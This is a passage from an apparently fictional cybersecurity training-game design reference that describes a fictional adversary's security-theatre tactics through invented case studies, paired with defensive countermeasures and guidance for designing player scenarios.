> - ENTROPY operated freely within "protected" network
> - Security tools actively aided ENTROPY operations
>
> **Discovery:**
> - New CISO ordered external security assessment
> - Penetration test found extensive misconfiguration
> - Investigation revealed agent's deliberate sabotage
>
> **SAFETYNET Analysis:**
> Security tools only effective if properly configured. Regular configuration audits essential. Segregation of duties (no single person controls all security). External validation of security posture.

**Technique 3: Visible Security, Hidden Vulnerabilities**

**Approach:** Emphasize visible security measures while hiding critical weaknesses

**Methods:**
- Impressive physical security (cameras, guards) with network weaknesses
- Strong perimeter defenses, weak internal security
- Focus on compliance over actual threat mitigation
- Security awareness programs that don't address real threats
- Audits that review only certain areas

**Case Study:**
> **"Operation Potemkin Village"** - Controlled Corporation
>
> **Company:** SecureServe Inc. (ENTROPY-controlled security firm)
>
> **Client Protection:** Appeared to provide excellent security
>
> **Visible Security:**
> - 24/7 SOC with impressive displays
> - Regular security reports to clients
> - Rapid incident response times
> - Professional security staff
> - Industry certifications and credentials
>
> **Hidden Reality:**
> - SOC monitored for non-ENTROPY threats only
> - Reports omitted ENTROPY activities
> - Incident response avoided ENTROPY indicators
> - Staff included ENTROPY operatives
> - Certifications real but security practices weak
>
> **Outcome:**
> - Clients felt extremely secure
> - ENTROPY had complete access through "security provider"
> - Lasted 4 years before exposure
>
> **SAFETYNET Analysis:**
> Trusted security providers are high-value targets for infiltration. Third-party validation essential. Security providers should be more scrutinized, not less.

**Technique 4: The Illusion of Improvement**

**Approach:** Make security changes that don't address real vulnerabilities

**Methods:**
- Update policies without changing practices
- Replace one vulnerable system with another
- Add security layers that don't affect ENTROPY access
- "Fix" irrelevant findings while ignoring critical ones
- Announce security improvements that are superficial

**Case Study:**
> **"Operation Busy Work"** - Infiltrated organization
>
> **Agent:** ENTROPY operative as security manager
>
> **Objective:** Appear proactive while maintaining vulnerabilities
>
> **Actions:**
> - Implemented password complexity requirements (ENTROPY had credential access tools)
> - Deployed USB port blocking (ENTROPY used network access)
> - Updated firewall rules (left backdoors intact)
> - Conducted security awareness training (omitted threats ENTROPY used)
> - Quarterly "security improvements" announced to leadership
>
> **Effect:**
> - Leadership believed security constantly improving
> - Resources spent on ineffective measures
> - Real vulnerabilities deliberately ignored
> - Budget exhausted on security theatre
>
> **Duration:** 3 years
>
> **Discovery:**
> - Data breach from unaddressed vulnerability
> - Investigation revealed pattern of misdirected security efforts
> - Agent's role in sabotage exposed
>
> **SAFETYNET Analysis:**
> Security metrics should focus on risk reduction, not activity. External assessment essential to validate improvements. Question security efforts that don't address known threats.

### Countermeasures (SAFETYNET Guidance)

**Prevention:**
- Risk-based security (address actual threats)
- Security effectiveness metrics
- Independent security validation
- Penetration testing and red team exercises
- Threat modeling and security architecture review

**Detection:**
- Discrepancy between security posture and breach frequency
- Security tools deployed but alerts ignored
- Pattern of security changes without risk reduction
- Overly confident security statements
- Resistance to external security assessment

**Response:**
- Full security audit if security theatre suspected
- Independent assessment of security effectiveness
- Review of security configurations and policies
- Replacement of compromised security personnel
- Implementation of genuine security measures

**Cultural Change:**
- Security substance over security appearance
- Leadership education on real vs. false security
- Incentivize risk reduction, not compliance checkboxes
- Continuous improvement based on threat landscape
- Transparency about security limitations

---

## Tactical Combinations

ENTROPY often combines tactics for maximum effectiveness:

**Social Engineering + Physical Infiltration:**
- Talk way past security, then plant hardware
- Example: "IT contractor" installing backdoored equipment

**Living off the Land + Multi-Stage:**
- Use legitimate tools throughout long-term operation
- Example: PowerShell-only attack over months

**Supply Chain + Security Theatre:**
- Compromise vendor, appear to provide security
- Example: Backdoored security product

**Physical + Cyber:**
- Hardware implant provides network access
- Example: USB device on internal network

**Multi-Stage + All Other Tactics:**
- Complex operation using every technique
- Example: 18-month operation with reconnaissance, social engineering, technical exploitation, and exfiltration

---

## SAFETYNET Defensive Strategy Summary

**Prevention (Stop attacks before they start):**
- Security awareness and training
- Technical controls and hardening
- Access controls and authentication
- Vendor security requirements
- Defense in depth architecture

**Detection (Find attacks in progress):**
- Behavioral monitoring and analytics
- Anomaly detection
- Threat hunting
- Regular security audits
- Employee reporting

**Response (React effectively when breached):**
- Incident response procedures
- Forensic capabilities
- Containment and remediation
- Law enforcement coordination
- Lessons learned and improvement

**Resilience (Survive and recover):**
- Backup and recovery
- Redundant systems
- Business continuity planning
- Regular testing and exercises
- Assume breach mentality

---

## Scenario Design Guidance

**Choosing Tactics for Scenarios:**

1. **Match Learning Objectives:**
   - Social engineering: Human factor awareness
   - Physical: Physical security importance
   - Supply chain: Trust relationship risks
   - Living off the land: Behavioral detection
   - Multi-stage: Comprehensive threat understanding
   - Security theatre: Critical thinking about security

2. **Match Player Skills:**
   - Technical players: Living off the land, multi-stage
   - Social players: Social engineering, physical infiltration
   - Mixed groups: Combinations of tactics

3. **Match Complexity:**
   - Beginner: Single tactic clearly demonstrated
   - Intermediate: Two tactics combined
   - Advanced: Full multi-stage with multiple tactics

4. **Create Realistic Scenarios:**
   - Mix successful and failed ENTROPY tactics
   - Show how defenders detect and respond
   - Include decision points for players
   - Demonstrate real-world techniques

**Example Scenario Design:**
> **"Operation Paradigm"**
>
> **Target:** Paradigm Shift Consultants (controlled corp)
>
> **Player Objective:** Infiltrate and gather evidence
>
> **ENTROPY Tactics Used:**
> - Security Theatre: Appears secure to avoid suspicion
> - Living off the Land: Uses legitimate tools to avoid malware detection
> - Multi-Stage: Long-term operations against multiple clients
>
> **Player Challenges:**
> - Bypass security theatre to find real vulnerabilities
> - Detect legitimate tools being used maliciously
> - Uncover multi-stage operation across multiple targets
>
> **Learning Outcomes:**
> - Recognize security theatre vs. real security
> - Understand living off the land techniques
> - Appreciate complexity of advanced persistent threats

---

## Cross-References

- **Who Uses These Tactics:** See [overview.md](overview.md)
- **Why They Use Them:** See [philosophy.md](philosophy.md)
- **Organizational Context:** See [operational_models.md](operational_models.md)
- **Operational Objectives:** See [common_schemes.md](common_schemes.md)

---

*Last Updated: November 2025*
*Classification: SAFETYNET INTERNAL - Scenario Design Reference*
